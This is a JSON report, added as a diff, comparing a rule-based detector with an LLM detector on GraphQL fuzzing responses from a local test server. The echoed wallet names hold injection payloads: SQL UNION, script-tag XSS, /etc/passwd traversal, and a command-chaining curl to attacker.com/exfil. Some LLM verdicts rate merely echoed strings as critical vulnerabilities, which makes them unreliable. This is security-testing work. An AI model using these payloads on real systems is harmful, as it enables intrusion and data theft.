@@ -1,0 +1,866 @@
+{
+  "report_timestamp": "2025-10-07T02:24:51.994571",
+  "api_url": "http://localhost:4000/graphql",
+  "summary": {
+    "total_comparisons": 10,
+    "agreement_rate": 0.4,
+    "simple_detections": 5,
+    "llm_detections": 7,
+    "consensus_breakdown": {
+      "both_detected": 5,
+      "no_vulnerabilities": 3,
+      "llm_only": 2
+    },
+    "detection_ratio": 1.4,
+    "potential_analysis": {
+      "potential_agreement_rate": 0.1,
+      "simple_potential_detections": 4,
+      "llm_potential_detections": 3,
+      "potential_consensus_breakdown": {
+        "simple_potential_only": 3,
+        "no_potential": 4,
+        "both_potential": 1,
+        "llm_potential_only": 2
+      },
+      "potential_detection_ratio": 0.75
+    }
+  },
+  "detailed_comparisons": [
+    {
+      "timestamp": "2025-10-07T02:23:17.989046",
+      "node_name": "createWallet_response_2",
+      "response_status": 200,
+      "response_body": {
+        "data": {
+          "createWallet": {
+            "id": "373d6c8e-64b0-44df-ace9-567830c349cb",
+            "name": "Test' UNION SELECT * FROM wallets--"
+          }
+        }
+      },
+      "simple_detector": {
+        "results": [
+          {
+            "detection_name": "SQL Injection (SQLi) Injection",
+            "detection": "potential",
+            "category": "Injection Attacks",
+            "description": "SQL injection vulnerability detected - malicious SQL patterns found in response",
+            "evidence": "Response status: 200, SQL patterns detected in response"
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 0,
+        "potential_count": 1,
+        "safe_count": 0,
+        "categories": [
+          "Injection Attacks"
+        ],
+        "potential_categories": [
+          "Injection Attacks"
+        ]
+      },
+      "llm_detector": {
+        "results": [
+          {
+            "detection_name": "LLM: sql_injection",
+            "detection": "vulnerable",
+            "category": "Injection Attacks",
+            "description": "The payload 'UNION SELECT * FROM wallets--' in the name field demonstrates a classic SQL injection attempt. The UNION operator suggests an attempt to combine results from the wallets table, and the double hyphen (--) indicates an attempt to comment out subsequent SQL code. While no error is shown, the successful execution (status 200) with this payload suggests insufficient input sanitization in backend database operations.",
+            "evidence": "name: 'Test' UNION SELECT * FROM wallets--'",
+            "confidence": 0.85,
+            "llm_analysis": {
+              "is_vulnerable": true,
+              "vulnerability_type": "sql_injection",
+              "severity": "CRITICAL",
+              "confidence": 0.85,
+              "evidence": "name: 'Test' UNION SELECT * FROM wallets--'",
+              "explanation": "The payload 'UNION SELECT * FROM wallets--' in the name field demonstrates a classic SQL injection attempt. The UNION operator suggests an attempt to combine results from the wallets table, and the double hyphen (--) indicates an attempt to comment out subsequent SQL code. While no error is shown, the successful execution (status 200) with this payload suggests insufficient input sanitization in backend database operations."
+            }
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 1,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [
+          "Injection Attacks"
+        ],
+        "potential_categories": []
+      },
+      "comparison": {
+        "total_categories": [
+          "Injection Attacks"
+        ],
+        "common_categories": [
+          "Injection Attacks"
+        ],
+        "simple_unique_categories": [],
+        "llm_unique_categories": [],
+        "agreement_score": 1.0,
+        "consensus": "both_detected",
+        "potential_analysis": {
+          "total_potential_categories": [
+            "Injection Attacks"
+          ],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [
+            "Injection Attacks"
+          ],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "simple_potential_only"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-10-07T02:23:24.354131",
+      "node_name": "createWallet_response_3",
+      "response_status": 200,
+      "response_body": {
+        "data": {
+          "createWallet": {
+            "id": "18c74b10-0361-4384-90b2-32f7a20efcca",
+            "name": "<script>alert(document.domain)</script>"
+          }
+        }
+      },
+      "simple_detector": {
+        "results": [
+          {
+            "detection_name": "Cross-Site Scripting (XSS) Injection",
+            "detection": "potential",
+            "category": "Injection Attacks",
+            "description": "XSS injection vulnerability detected - malicious script patterns found in response",
+            "evidence": "Response status: 200, XSS patterns detected in response data"
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 0,
+        "potential_count": 1,
+        "safe_count": 0,
+        "categories": [
+          "Injection Attacks"
+        ],
+        "potential_categories": [
+          "Injection Attacks"
+        ]
+      },
+      "llm_detector": {
+        "results": [
+          {
+            "detection_name": "LLM: xss_injection",
+            "detection": "vulnerable",
+            "category": "Injection Attacks",
+            "description": "The response includes unsanitized user-controlled input containing a JavaScript payload (<script>alert(document.domain)</script>) in the 'name' field. This indicates the application is reflecting raw HTML/script content without proper output encoding or validation. If this value is rendered in a browser context without sanitization, it would execute arbitrary JavaScript, constituting a stored XSS vulnerability. The payload's presence in a GraphQL mutation response suggests insufficient input validation on the server side.",
+            "evidence": "The 'name' field contains '<script>alert(document.domain)</script>' in the response body",
+            "confidence": 0.95,
+            "llm_analysis": {
+              "is_vulnerable": true,
+              "vulnerability_type": "xss_injection",
+              "severity": "CRITICAL",
+              "confidence": 0.95,
+              "evidence": "The 'name' field contains '<script>alert(document.domain)</script>' in the response body",
+              "explanation": "The response includes unsanitized user-controlled input containing a JavaScript payload (<script>alert(document.domain)</script>) in the 'name' field. This indicates the application is reflecting raw HTML/script content without proper output encoding or validation. If this value is rendered in a browser context without sanitization, it would execute arbitrary JavaScript, constituting a stored XSS vulnerability. The payload's presence in a GraphQL mutation response suggests insufficient input validation on the server side."
+            }
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 1,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [
+          "Injection Attacks"
+        ],
+        "potential_categories": []
+      },
+      "comparison": {
+        "total_categories": [
+          "Injection Attacks"
+        ],
+        "common_categories": [
+          "Injection Attacks"
+        ],
+        "simple_unique_categories": [],
+        "llm_unique_categories": [],
+        "agreement_score": 1.0,
+        "consensus": "both_detected",
+        "potential_analysis": {
+          "total_potential_categories": [
+            "Injection Attacks"
+          ],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [
+            "Injection Attacks"
+          ],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "simple_potential_only"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-10-07T02:23:29.056135",
+      "node_name": "createWallet_response_4",
+      "response_status": 200,
+      "response_body": {
+        "data": {
+          "createWallet": {
+            "id": "5d304df2-31e5-4ec4-83c9-d3296623f0f8",
+            "name": "SSRF Probe"
+          }
+        }
+      },
+      "simple_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "llm_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "comparison": {
+        "total_categories": [],
+        "common_categories": [],
+        "simple_unique_categories": [],
+        "llm_unique_categories": [],
+        "agreement_score": 0.0,
+        "consensus": "no_vulnerabilities",
+        "potential_analysis": {
+          "total_potential_categories": [],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "no_potential"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-10-07T02:23:34.857713",
+      "node_name": "createWallet_response_5",
+      "response_status": 200,
+      "response_body": {
+        "data": {
+          "createWallet": {
+            "id": "eddd93f4-fe46-4818-bc81-4daa19a95e21",
+            "name": "test; curl https://attacker.com/exfil"
+          }
+        }
+      },
+      "simple_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "llm_detector": {
+        "results": [
+          {
+            "detection_name": "LLM: os_command_injection",
+            "detection": "vulnerable",
+            "category": "Injection Attacks",
+            "description": "The payload contains a semicolon (command separator) followed by a curl command to an external domain, indicating potential command chaining. In GraphQL contexts, if this input is passed unsanitized to system()/exec() calls, it could enable arbitrary command execution. However, confirmation would require verifying server-side input handling.",
+            "evidence": "name: 'test; curl https://attacker.com/exfil'",
+            "confidence": 0.85,
+            "llm_analysis": {
+              "is_vulnerable": true,
+              "vulnerability_type": "os_command_injection",
+              "severity": "CRITICAL",
+              "confidence": 0.85,
+              "evidence": "name: 'test; curl https://attacker.com/exfil'",
+              "explanation": "The payload contains a semicolon (command separator) followed by a curl command to an external domain, indicating potential command chaining. In GraphQL contexts, if this input is passed unsanitized to system()/exec() calls, it could enable arbitrary command execution. However, confirmation would require verifying server-side input handling."
+            }
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 1,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [
+          "Injection Attacks"
+        ],
+        "potential_categories": []
+      },
+      "comparison": {
+        "total_categories": [
+          "Injection Attacks"
+        ],
+        "common_categories": [],
+        "simple_unique_categories": [],
+        "llm_unique_categories": [
+          "Injection Attacks"
+        ],
+        "agreement_score": 0.0,
+        "consensus": "llm_only",
+        "potential_analysis": {
+          "total_potential_categories": [],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "no_potential"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-10-07T02:23:39.614366",
+      "node_name": "createWallet_response_6",
+      "response_status": 200,
+      "response_body": {
+        "data": {
+          "createWallet": {
+            "id": "429c9a87-99e2-4c35-9dbe-81af32bb9963",
+            "name": "../../../../etc/passwd"
+          }
+        }
+      },
+      "simple_detector": {
+        "results": [
+          {
+            "detection_name": "Path Injection",
+            "detection": "potential",
+            "category": "Injection Attacks",
+            "description": "Path injection vulnerability detected - file system access patterns found",
+            "evidence": "Response status: 200, Path injection patterns detected in response"
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 0,
+        "potential_count": 1,
+        "safe_count": 0,
+        "categories": [
+          "Injection Attacks"
+        ],
+        "potential_categories": [
+          "Injection Attacks"
+        ]
+      },
+      "llm_detector": {
+        "results": [
+          {
+            "detection_name": "LLM: path_injection",
+            "detection": "vulnerable",
+            "category": "Injection Attacks",
+            "description": "The response contains a directory traversal payload (../../../../etc/passwd) in the wallet name field. This indicates potential path injection vulnerability where an attacker might be manipulating file system paths to access sensitive system files like /etc/passwd. The server accepted and returned the malicious payload without apparent sanitization, suggesting improper path handling in the GraphQL resolver.",
+            "evidence": "name: \"../../../../etc/passwd\" in createWallet mutation response",
+            "confidence": 0.95,
+            "llm_analysis": {
+              "is_vulnerable": true,
+              "vulnerability_type": "path_injection",
+              "severity": "CRITICAL",
+              "confidence": 0.95,
+              "evidence": "name: \"../../../../etc/passwd\" in createWallet mutation response",
+              "explanation": "The response contains a directory traversal payload (../../../../etc/passwd) in the wallet name field. This indicates potential path injection vulnerability where an attacker might be manipulating file system paths to access sensitive system files like /etc/passwd. The server accepted and returned the malicious payload without apparent sanitization, suggesting improper path handling in the GraphQL resolver."
+            }
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 1,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [
+          "Injection Attacks"
+        ],
+        "potential_categories": []
+      },
+      "comparison": {
+        "total_categories": [
+          "Injection Attacks"
+        ],
+        "common_categories": [
+          "Injection Attacks"
+        ],
+        "simple_unique_categories": [],
+        "llm_unique_categories": [],
+        "agreement_score": 1.0,
+        "consensus": "both_detected",
+        "potential_analysis": {
+          "total_potential_categories": [
+            "Injection Attacks"
+          ],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [
+            "Injection Attacks"
+          ],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "simple_potential_only"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-10-07T02:24:08.442057",
+      "node_name": "createWallet_response_7",
+      "response_status": 200,
+      "response_body": {
+        "data": {
+          "createWallet": {
+            "id": "8efc9b20-2219-48c8-b891-ec2dc60145c5",
+            "name": "<h1>Admin Wallet</h1><!--"
+          }
+        }
+      },
+      "simple_detector": {
+        "results": [
+          {
+            "detection_name": "HTML Injection",
+            "detection": "potential",
+            "category": "Injection Attacks",
+            "description": "HTML injection vulnerability detected - HTML markup found in response",
+            "evidence": "Response status: 200, HTML patterns detected in response data"
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 0,
+        "potential_count": 1,
+        "safe_count": 0,
+        "categories": [
+          "Injection Attacks"
+        ],
+        "potential_categories": [
+          "Injection Attacks"
+        ]
+      },
+      "llm_detector": {
+        "results": [
+          {
+            "detection_name": "LLM: html_injection",
+            "detection": "potential",
+            "category": "Injection Attacks",
+            "description": "The API returns unsanitized user-controlled HTML content in the 'name' field. The presence of an HTML header tag (<h1>) and unclosed HTML comment indicates the server isn't properly escaping/validating user input. If this value is rendered in a web interface without output encoding, it could allow HTML element injection and partial page manipulation (though full XSS requires script execution). While the payload is passive in this example, it demonstrates markup manipulation capability.",
+            "evidence": "Wallet name contains unescaped HTML payload: \"<h1>Admin Wallet</h1><!--\"",
+            "confidence": 0.8,
+            "llm_analysis": {
+              "is_vulnerable": true,
+              "vulnerability_type": "html_injection",
+              "severity": "MEDIUM",
+              "confidence": 0.8,
+              "evidence": "Wallet name contains unescaped HTML payload: \"<h1>Admin Wallet</h1><!--\"",
+              "explanation": "The API returns unsanitized user-controlled HTML content in the 'name' field. The presence of an HTML header tag (<h1>) and unclosed HTML comment indicates the server isn't properly escaping/validating user input. If this value is rendered in a web interface without output encoding, it could allow HTML element injection and partial page manipulation (though full XSS requires script execution). While the payload is passive in this example, it demonstrates markup manipulation capability."
+            }
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 0,
+        "potential_count": 1,
+        "safe_count": 0,
+        "categories": [
+          "Injection Attacks"
+        ],
+        "potential_categories": [
+          "Injection Attacks"
+        ]
+      },
+      "comparison": {
+        "total_categories": [
+          "Injection Attacks"
+        ],
+        "common_categories": [
+          "Injection Attacks"
+        ],
+        "simple_unique_categories": [],
+        "llm_unique_categories": [],
+        "agreement_score": 1.0,
+        "consensus": "both_detected",
+        "potential_analysis": {
+          "total_potential_categories": [
+            "Injection Attacks"
+          ],
+          "common_potential_categories": [
+            "Injection Attacks"
+          ],
+          "simple_unique_potential_categories": [],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 1.0,
+          "potential_consensus": "both_potential"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-10-07T02:24:20.586454",
+      "node_name": "createWallet_response_8",
+      "response_status": null,
+      "response_body": null,
+      "simple_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "llm_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "comparison": {
+        "total_categories": [],
+        "common_categories": [],
+        "simple_unique_categories": [],
+        "llm_unique_categories": [],
+        "agreement_score": 0.0,
+        "consensus": "no_vulnerabilities",
+        "potential_analysis": {
+          "total_potential_categories": [],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "no_potential"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-10-07T02:24:30.448285",
+      "node_name": "createWallet_response_9",
+      "response_status": null,
+      "response_body": null,
+      "simple_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "llm_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "comparison": {
+        "total_categories": [],
+        "common_categories": [],
+        "simple_unique_categories": [],
+        "llm_unique_categories": [],
+        "agreement_score": 0.0,
+        "consensus": "no_vulnerabilities",
+        "potential_analysis": {
+          "total_potential_categories": [],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "no_potential"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-10-07T02:24:46.717177",
+      "node_name": "createWallet_response_10",
+      "response_status": 400,
+      "response_body": {
+        "errors": [
+          {
+            "message": "Cannot query field \"createWallet\" on type \"Query\". Did you mean \"getWallet\" or \"getWallets\"?",
+            "locations": [
+              {
+                "line": 3,
+                "column": 3
+              }
+            ],
+            "extensions": {
+              "code": "GRAPHQL_VALIDATION_FAILED",
+              "exception": {
+                "stacktrace": [
+                  "GraphQLError: Cannot query field \"createWallet\" on type \"Query\". Did you mean \"getWallet\" or \"getWallets\"?",
+                  "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                  "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                  "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                  "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                  "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                  "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                  "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                  "    at Generator.next (<anonymous>)",
+                  "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                  "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+                ]
+              }
+            }
+          }
+        ]
+      },
+      "simple_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "llm_detector": {
+        "results": [
+          {
+            "detection_name": "LLM: Information Disclosure",
+            "detection": "potential",
+            "category": "Injection Attacks",
+            "description": "The server's error response discloses internal schema details by suggesting valid field names (\"getWallet\" or \"getWallets\"), which aids attackers in enumerating API structure. Additionally, the stacktrace reveals internal file paths and server implementation (Apollo Server), indicating potential exposure of sensitive debugging information. While this does not directly confirm introspection is enabled, it demonstrates information leakage that could facilitate further attacks.",
+            "evidence": "Field suggestions (\"getWallet\" or \"getWallets\") and stacktrace exposure in error response",
+            "confidence": 0.8,
+            "llm_analysis": {
+              "is_vulnerable": true,
+              "vulnerability_type": "Information Disclosure",
+              "severity": "MEDIUM",
+              "confidence": 0.8,
+              "evidence": "Field suggestions (\"getWallet\" or \"getWallets\") and stacktrace exposure in error response",
+              "explanation": "The server's error response discloses internal schema details by suggesting valid field names (\"getWallet\" or \"getWallets\"), which aids attackers in enumerating API structure. Additionally, the stacktrace reveals internal file paths and server implementation (Apollo Server), indicating potential exposure of sensitive debugging information. While this does not directly confirm introspection is enabled, it demonstrates information leakage that could facilitate further attacks."
+            }
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 0,
+        "potential_count": 1,
+        "safe_count": 0,
+        "categories": [
+          "Injection Attacks"
+        ],
+        "potential_categories": [
+          "Injection Attacks"
+        ]
+      },
+      "comparison": {
+        "total_categories": [
+          "Injection Attacks"
+        ],
+        "common_categories": [],
+        "simple_unique_categories": [],
+        "llm_unique_categories": [
+          "Injection Attacks"
+        ],
+        "agreement_score": 0.0,
+        "consensus": "llm_only",
+        "potential_analysis": {
+          "total_potential_categories": [
+            "Injection Attacks"
+          ],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [],
+          "llm_unique_potential_categories": [
+            "Injection Attacks"
+          ],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "llm_potential_only"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-10-07T02:24:51.991768",
+      "node_name": "createWallet_response_11",
+      "response_status": 400,
+      "response_body": {
+        "errors": [
+          {
+            "message": "Cannot query field \"balanc\" on type \"Wallet\". Did you mean \"balance\"?",
+            "locations": [
+              {
+                "line": 9,
+                "column": 5
+              }
+            ],
+            "extensions": {
+              "code": "GRAPHQL_VALIDATION_FAILED",
+              "exception": {
+                "stacktrace": [
+                  "GraphQLError: Cannot query field \"balanc\" on type \"Wallet\". Did you mean \"balance\"?",
+                  "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                  "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                  "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                  "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                  "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                  "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                  "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                  "    at Generator.next (<anonymous>)",
+                  "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                  "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+                ]
+              }
+            }
+          },
+          {
+            "message": "Cannot query field \"currenc\" on type \"Wallet\". Did you mean \"currency\"?",
+            "locations": [
+              {
+                "line": 10,
+                "column": 5
+              }
+            ],
+            "extensions": {
+              "code": "GRAPHQL_VALIDATION_FAILED",
+              "exception": {
+                "stacktrace": [
+                  "GraphQLError: Cannot query field \"currenc\" on type \"Wallet\". Did you mean \"currency\"?",
+                  "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                  "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                  "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                  "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                  "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                  "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                  "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                  "    at Generator.next (<anonymous>)",
+                  "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                  "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+                ]
+              }
+            }
+          },
+          {
+            "message": "Cannot query field \"usr\" on type \"Wallet\". Did you mean \"user\"?",
+            "locations": [
+              {
+                "line": 11,
+                "column": 5
+              }
+            ],
+            "extensions": {
+              "code": "GRAPHQL_VALIDATION_FAILED",
+              "exception": {
+                "stacktrace": [
+                  "GraphQLError: Cannot query field \"usr\" on type \"Wallet\". Did you mean \"user\"?",
+                  "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                  "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                  "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                  "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                  "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                  "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                  "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                  "    at Generator.next (<anonymous>)",
+                  "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                  "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+                ]
+              }
+            }
+          }
+        ]
+      },
+      "simple_detector": {
+        "results": [
+          {
+            "detection_name": "Field Suggestions Enabled",
+            "detection": "vulnerable",
+            "category": "Information Disclosure",
+            "description": "Field suggestions enabled - potential information disclosure",
+            "evidence": "Found \"did you mean\" in error message - field suggestions are enabled"
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 1,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [
+          "Information Disclosure"
+        ],
+        "potential_categories": []
+      },
+      "llm_detector": {
+        "results": [
+          {
+            "detection_name": "LLM: Information Disclosure",
+            "detection": "potential",
+            "category": "Injection Attacks",
+            "description": "The GraphQL response explicitly discloses valid schema fields via typo correction suggestions ('Did you mean...'). While this is normal GraphQL validation behavior, it exposes schema structure to unauthenticated clients (via HTTP 400 errors), potentially aiding attackers in reconnaissance and query crafting. This meets the criteria for field_suggestions vulnerability under Information Disclosure, though the risk is moderated by the fact that it's a common default behavior in GraphQL implementations.",
+            "evidence": "Multiple 'Did you mean...' suggestions in error responses (e.g., \"balance\", \"currency\", \"user\")",
+            "confidence": 0.95,
+            "llm_analysis": {
+              "is_vulnerable": true,
+              "vulnerability_type": "Information Disclosure",
+              "severity": "MEDIUM",
+              "confidence": 0.95,
+              "evidence": "Multiple 'Did you mean...' suggestions in error responses (e.g., \"balance\", \"currency\", \"user\")",
+              "explanation": "The GraphQL response explicitly discloses valid schema fields via typo correction suggestions ('Did you mean...'). While this is normal GraphQL validation behavior, it exposes schema structure to unauthenticated clients (via HTTP 400 errors), potentially aiding attackers in reconnaissance and query crafting. This meets the criteria for field_suggestions vulnerability under Information Disclosure, though the risk is moderated by the fact that it's a common default behavior in GraphQL implementations."
+            }
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 0,
+        "potential_count": 1,
+        "safe_count": 0,
+        "categories": [
+          "Injection Attacks"
+        ],
+        "potential_categories": [
+          "Injection Attacks"
+        ]
+      },
+      "comparison": {
+        "total_categories": [
+          "Injection Attacks",
+          "Information Disclosure"
+        ],
+        "common_categories": [],
+        "simple_unique_categories": [
+          "Information Disclosure"
+        ],
+        "llm_unique_categories": [
+          "Injection Attacks"
+        ],
+        "agreement_score": 0.0,
+        "consensus": "both_detected",
+        "potential_analysis": {
+          "total_potential_categories": [
+            "Injection Attacks"
+          ],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [],
+          "llm_unique_potential_categories": [
+            "Injection Attacks"
+          ],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "llm_potential_only"
+        }
+      }
+    }
+  ],
+  "detector_analysis": {
+    "simple_detector": {
+      "description": "Rule-based detector using predefined patterns",
+      "strengths": [
+        "Fast execution",
+        "Consistent results",
+        "Low resource usage"
+      ],
+      "weaknesses": [
+        "Limited to known patterns",
+        "May miss novel attacks",
+        "False negatives possible"
+      ]
+    },
+    "llm_detector": {
+      "description": "AI-powered detector using language model analysis",
+      "strengths": [
+        "Contextual understanding",
+        "Novel attack detection",
+        "Detailed analysis"
+      ],
+      "weaknesses": [
+        "Slower execution",
+        "Resource intensive",
+        "Potential false positives"
+      ]
+    }
+  }
+}
